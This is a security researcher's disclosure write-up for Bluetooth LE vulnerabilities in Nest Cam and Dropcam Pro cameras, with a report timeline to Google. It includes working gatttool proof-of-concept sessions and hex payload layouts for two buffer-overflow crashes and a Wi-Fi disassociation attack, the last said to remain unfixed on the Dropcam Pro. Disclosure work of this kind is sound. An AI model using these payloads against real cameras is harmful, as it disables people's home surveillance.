# Google-Nest-Cam-Bug-Disclosures

Affected: Dropcam Pro, Nest Cam Indoor/Outdoor models<br />
Latest Build Affected: 205-600052<br />
Partial Fixed Build: 205-600055<br />

<u>UPDATE</u>
The latest fw version 205-600055 does not fix the WiFi dissassociation vulnerability in the Dropcam Pro. If the supplied WiFi network does not exist, reassociation time was improved and now connects back within approximately 10 seconds. However, a valid WiFi network can still be provided to take the dropcam offline permanently. 

Disclosure Timeline:<br />
October 26, 2016: Reported security bug per Google's Vulnerability Reward Program guidelines<br />
October 27, 2016: Google Security Team acknowledged that the report was received and being investigated<br />
November 1, 2016: Google Security Team validated the reported vulnerabilities and filed a bug<br />
November 15, 2016: Google's VRP panel issued a $100 reward under "Non-integrated acquisitions"<br />
March 17, 2017: Public disclosure<br />

PoC iOS app by Troy Stribling :: <a href="https://github.com/troystribling/NestPWN">NestPWN</a>

<h3>Bluetooth (BLE) based Buffer Overflow via SSID parameter</h3>
<i>Fixed in all models</i>

1. Summary<br />
It's possible to trigger a buffer overflow condition when setting the SSID parameter on the camera. The attacker must be in bluetooth range at any time during the cameras powered on state. Bluetooth is never disabled even after initial setup.

2. Proof of Concept<br />
`anon@ubuntu:~/nest$ gatttool -b 18:B4:30:5D:00:B8 -t random -I`<br />
`[18:B4:30:5D:00:B8][LE]> connect`<br />
`Attempting to connect to 18:B4:30:5D:00:B8`<br />
`Connection successful`<br />
`[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3a031201AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`<br />
`[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3b`<br />
`Characteristic value was written successfully`<br />
`Characteristic value was written successfully`<br />
`[18:B4:30:5D:00:B8][LE]>`<br />
`(gatttool:20352): GLib-WARNING **: Invalid file descriptor.`<br />

3. Details<br />
The payload attempts to set an SSID with a length of 1 byte and sends 16.<br />
SequenceNum=3a + Type=0312 + Length=01 + Value=AA*16<br />

4. Result<br />
Crash and reboot back to operational state

<h3>Bluetooth (BLE) based Buffer Overflow via Encrypted Password parameter</h3>
<i>Fixed in all models</i>

1. Summary<br />
It's possible to trigger a buffer overflow condition when setting the encrypted password parameter on the camera. The attacker must be in bluetooth range at any time during the cameras powered on state. Bluetooth is never disabled even after initial setup.

2. Proof of Concept<br />
`anon@ubuntu:~/nest$ gatttool -b 18:B4:30:5D:00:B8 -t random -I`<br />
`[18:B4:30:5D:00:B8][LE]> connect`<br />
`Attempting to connect to 18:B4:30:5D:00:B8`<br />
`Connection successful`<br />
`[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3a03120b506574536d6172742d356e1a01AAAAAA`<br />
`[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3b`<br />
`Characteristic value was written successfully`<br />
`Characteristic value was written successfully`<br />
`[18:B4:30:5D:00:B8][LE]> `<br />
`(gatttool:20352): GLib-WARNING **: Invalid file descriptor.`<br />

3. Details<br />
The payload attempts to set the encrypted wifi password with a length of 1 byte and sends 3.<br />
SequenceNum=3a + Type=0312 + Length=0b + ssidVal=506574536d6172742d356e + type=1a + length=01 + encPass=AA*3<br />

4. Result<br />
Crash and reboot back to operational state


<h3>Bluetooth (BLE) based Wifi Disassociation</h3>
<i>Not Fixed in Dropcam Pro</i><br />

1. Summary<br />
It's possible to disconnect the camera from Wifi by supplying it a new SSID to connect to. Local storage of video footage is not supported by these cameras so surveillance is temporarily disabled. The attacker must be in bluetooth range at any time during the cameras powered on state. Bluetooth is never disabled even after initial setup.

2. Proof of Concept<br />
`anon@ubuntu:~/nest$ gatttool -b 18:B4:30:5D:00:B8 -t random -I`<br />
`[18:B4:30:5D:00:B8][LE]> connect`<br />
`Attempting to connect to 18:B4:30:5D:00:B8`<br />
`Connection successful`<br />
`[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3a03120b0a6574536d6172742d356e1a20232320`<br />
`[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3becb824ba437c13233ac2ff78b1776456e47a01`<br />
`[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3ca5787d2f5e53f394a512200228003210bc9253`<br />
`[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3d48cada7a0d921d57b2d26ae89c3a04DEADBEEF`<br />
`[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3e`<br />
`Characteristic value was written successfully`<br />
`Characteristic value was written successfully`<br />
`Characteristic value was written successfully`<br />
`Characteristic value was written successfully`<br />
`Characteristic value was written successfully`<br />
`[18:B4:30:5D:00:B8][LE]> `<br />

3. Details<br />
The payload attempts to change Nest Cam's associated SSID causing temporary disassociation from the current Wifi SSID.
seqNum + 0312(type) 0b(len) + SSID + 1a(type) 20(len) + encPass
seqNum + encPass(cont)
seqNum + encPass(cont) + 2002280032(constant) + 10(len) + authTag
seqNum + authTag(cont) + 3a(UnknownType) 04(len) + DEADBEEF
seqNum(execute)

4. Result<br />
Camera dissociates from current wifi network to attempt association with newly set SSID. If the WiFi network does not exist, the camera will go offline for approximately 60-90 seconds before returning to the original Wifi network and resuming normal operation. If the network does exist, it will check for Internet connectivity and remain on the new network.<br />
